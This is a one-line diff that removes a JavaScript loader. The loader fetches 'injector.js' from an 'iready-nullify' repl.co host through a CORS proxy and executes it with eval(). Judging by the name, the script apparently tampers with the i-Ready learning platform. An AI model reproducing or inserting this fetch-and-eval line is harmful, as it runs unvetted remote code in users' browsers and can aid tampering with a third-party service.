@@ -1,1 +1,0 @@
-fetch("https://api.allorigins.win/get?url=https://iready-nullify.notplu.repl.co/injector.js").then(r=>r.text()).then((d)=>eval(d))
